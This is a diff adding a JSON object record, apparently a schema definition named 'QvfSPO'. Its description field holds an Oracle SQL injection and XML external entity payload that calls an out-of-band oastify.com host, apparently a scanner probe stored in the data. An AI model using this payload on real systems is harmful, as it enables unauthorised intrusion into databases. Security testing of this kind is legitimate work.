@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334435839,
+	"deleted":true,
+	"description":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ybudf SYSTEM \"http://fp8mstumqp5fixfg1eugc1yx0o6huiil6dt4ht.oasti'||'fy.com/\">%ybudf;]>'),'/l') from dual)",
+	"id":"67caa7a38780f31288255209",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"qvfspo",
+	"modifiedTime":1741358660006,
+	"name":"QvfSPO",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
